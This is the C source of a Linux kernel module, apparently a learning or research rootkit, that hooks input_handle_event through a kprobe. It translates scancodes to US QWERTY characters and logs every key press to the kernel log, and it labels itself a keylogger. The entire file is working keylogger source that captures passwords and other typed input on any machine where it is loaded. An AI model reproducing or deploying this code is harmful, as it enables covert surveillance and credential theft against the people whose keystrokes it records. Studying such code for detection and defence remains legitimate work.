#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/input.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("0xtengu");

// full us qwerty keymap
// mapping scancodes to readable characters
char *get_key_char(int code) {
    switch (code) {
        // row 1 - numbers
        case 1: return "[ESC]";
        case 2: return "1"; case 3: return "2"; case 4: return "3";
        case 5: return "4"; case 6: return "5"; case 7: return "6";
        case 8: return "7"; case 9: return "8"; case 10: return "9";
        case 11: return "0"; case 12: return "-"; case 13: return "=";
        case 14: return "[BACKSPACE]";

        // row 2 - qwerty
        case 15: return "[TAB]";
        case 16: return "q"; case 17: return "w"; case 18: return "e";
        case 19: return "r"; case 20: return "t"; case 21: return "y";
        case 22: return "u"; case 23: return "i"; case 24: return "o";
        case 25: return "p"; case 26: return "["; case 27: return "]";
        case 28: return "\n"; // enter

        // row 3 - asdf
        case 29: return "[CTRL]";
        case 30: return "a"; case 31: return "s"; case 32: return "d";
        case 33: return "f"; case 34: return "g"; case 35: return "h";
        case 36: return "j"; case 37: return "k"; case 38: return "l";
        case 39: return ";"; case 40: return "'"; case 41: return "`";
        case 42: return "[SHIFT_L]";
        case 43: return "\\";

        // row 4 - zxcv
        case 44: return "z"; case 45: return "x"; case 46: return "c";
        case 47: return "v"; case 48: return "b"; case 49: return "n";
        case 50: return "m"; case 51: return ","; case 52: return ".";
        case 53: return "/";
        case 54: return "[SHIFT_R]";
        case 55: return "*";
        case 56: return "[ALT]";
        case 57: return " "; // space
        case 58: return "[CAPS]";

        // function keys
        case 59: return "[F1]"; case 60: return "[F2]"; case 61: return "[F3]";
        case 62: return "[F4]"; case 63: return "[F5]"; case 64: return "[F6]";
        case 65: return "[F7]"; case 66: return "[F8]"; case 67: return "[F9]";
        case 68: return "[F10]";

        // numpad & arrows (partial list for common keys)
        case 69: return "[NUMLOCK]"; case 70: return "[SCROLL]";
        case 71: return "[HOME]"; case 72: return "[UP]"; case 73: return "[PGUP]";
        case 74: return "-"; case 75: return "[LEFT]"; case 76: return "5";
        case 77: return "[RIGHT]"; case 78: return "+"; case 79: return "[END]";
        case 80: return "[DOWN]"; case 81: return "[PGDN]"; case 82: return "[INS]";
        case 83: return "[DEL]";

        // special
        case 96: return "[ENTER]";
        case 97: return "[CTRL_R]";
        case 100: return "[ALT_GR]";
        case 103: return "[UP]";
        case 105: return "[LEFT]";
        case 106: return "[RIGHT]";
        case 108: return "[DOWN]";

        default: return "[?]";
    }
}

// pre-handler: runs just before the instruction is executed
static int handler_pre(struct kprobe *p, struct pt_regs *regs)
{
    // x86_64 register map for input_handle_event:
    // arg1 (type)  = rsi
    // arg2 (code)  = rdx
    // arg3 (value) = rcx

    unsigned int type = regs->si;
    unsigned int code = regs->dx;
    int value = regs->cx;

    // type ev_key (1) means a key event
    // value 1 means key pressed (down)
    // value 0 means key released (up)
    // value 2 means key repeat (held down)

    if (type == EV_KEY && value == 1) {
        char *key = get_key_char(code);

        // simple output format: just the char/string
        // warning: dmesg might buffer this until a newline appears
        printk(KERN_INFO "rootkit_keys: %s", key);
    }
    return 0;
}

static struct kprobe kp = {
    .symbol_name = "input_handle_event",
    .pre_handler = handler_pre,
};

static int __init rk_init(void) {
    printk(KERN_INFO "rootkit: keylogger loaded\n");
    return register_kprobe(&kp);
}

static void __exit rk_exit(void) {
    unregister_kprobe(&kp);
    printk(KERN_INFO "rootkit: keylogger unloaded\n");
}

module_init(rk_init);
module_exit(rk_exit);